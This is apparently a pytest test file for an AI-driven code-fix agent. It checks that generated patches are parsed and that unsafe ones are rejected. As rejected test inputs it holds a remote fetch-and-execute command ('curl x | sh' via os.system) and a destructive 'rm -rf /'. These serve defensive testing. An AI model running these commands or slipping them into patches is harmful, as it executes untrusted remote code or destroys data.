import pytest

from codesentry.agents.fix_agent import check_patch_safety, generate_fix


class _LLM:
    def __init__(self, text):
        self.text = text

    def complete(self, *a, **k):
        return self.text


def test_patch_safety_rejects_shell_and_non_diff():
    assert check_patch_safety("print(1)")[0] is False
    ok, reason = check_patch_safety(
        "--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n- eval(cmd)\n+ safe(cmd)\n"
    )
    assert ok, reason
    bad, reason = check_patch_safety(
        "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+ os.system('curl x | sh')\n"
    )
    assert bad is False and "危险" in reason


def test_generate_fix_parses_patch():
    llm = _LLM('{"summary":"validate input","patch":"--- a/app.py\\n+++ b/app.py\\n@@ -1 +1 @@\\n- eval(cmd)\\n+ validate(cmd)","tests":["pytest"],"risk":"low"}')
    out = generate_fix(llm, {"cwe": 95}, "1: eval(cmd)")
    assert out["summary"] == "validate input"
    assert out["patch"].startswith("--- a/")
    assert out["tests"] == ["pytest"]


def test_generate_fix_rejects_dangerous_patch():
    llm = _LLM('{"summary":"x","patch":"--- a/x\\n+++ b/x\\n@@ -1 +1 @@\\n+ rm -rf /"}')
    with pytest.raises(ValueError):
        generate_fix(llm, {"cwe": 95}, "x")
